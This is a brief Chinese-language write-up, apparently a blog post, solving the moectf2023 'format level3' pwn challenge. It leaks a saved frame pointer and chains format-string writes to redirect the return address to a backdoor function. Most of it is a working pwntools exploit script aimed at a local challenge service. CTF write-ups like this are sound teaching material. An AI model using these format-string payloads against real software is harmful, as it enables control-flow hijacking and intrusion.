---
title: moectf2023 - format level3
date: 2023/9/26 12:00:00
updated: 2024/7/30 10:28:00
tags:
    - noob
excerpt: 通过利用ebp间接改写返回地址，成功利用后门漏洞解决format level3题目。
---

## 文件分析

下载`format_level3`, NX on, PIE off, Canary on, RELRO full  
ghidra分析为32位程序

## 解题思路

和level2类似，存在后门，但是输入的str放到了.bss上

{% note tip fa-arrow-right %}
16字节还想把栈迁移到.bss上？直接爆了（栈上的空间本来也不够）

正解：通过ebp+4来利用ebp间接改写返回地址
{% endnote %}

## EXPLOIT

```python
from pwn import *
sh = remote('localhost', 39665)

# payload 1
sh.sendline(b'3')
sh.sendline(b'%6$p')

prevEbp = int(sh.recvuntil(b'\nBut', True)[-10:], 16) # ebp -> prevEbp -> prevPrevEbp
retAddr = prevEbp + 4

# payload 2
sh.sendline(b'3')
sh.sendline(f'%{retAddr & 0xff}d%6$hhn'.encode())     # ebp -> prevEbp -> retAddr

# payload 3
sh.sendlineafter(b'ice:',b'3') # 不加after会导致所有输出全部挤在一起，原因未知
sh.sendline(f'%{0x9317}d%14$hn'.encode()) # retAddr: main -> success

# payload 4
sh.sendlineafter(b'ice:', b'4') # let it return

sh.interactive()
```

Done.
